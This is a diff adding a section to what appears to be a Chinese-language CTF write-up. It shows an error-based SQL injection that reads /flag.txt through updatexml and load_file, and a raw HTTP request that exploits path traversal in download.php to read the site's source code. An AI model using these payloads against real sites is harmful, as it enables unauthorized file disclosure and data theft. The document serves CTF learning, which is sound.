@@ -239,3 +239,30 @@ get_detail()
 1' where user_id=updatexml(1,concat(0x7e,(select substr(load_file('/flag.txt'),20,40)),0x7e),1)#
 ```
 
+
+
+
+
+## Dropbox
+
+通过`download.php`来读取源代码
+
+```
+POST /download.php HTTP/1.1
+Host: 6bf1e8b9-43fe-4ea5-bb12-5157beed00dd.node3.buuoj.cn
+Content-Length: 27
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://6bf1e8b9-43fe-4ea5-bb12-5157beed00dd.node3.buuoj.cn
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://6bf1e8b9-43fe-4ea5-bb12-5157beed00dd.node3.buuoj.cn/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=c09d565f0771a7a544d94f9e93e8b13c
+Connection: close
+
+filename=../../download.php
+```
+
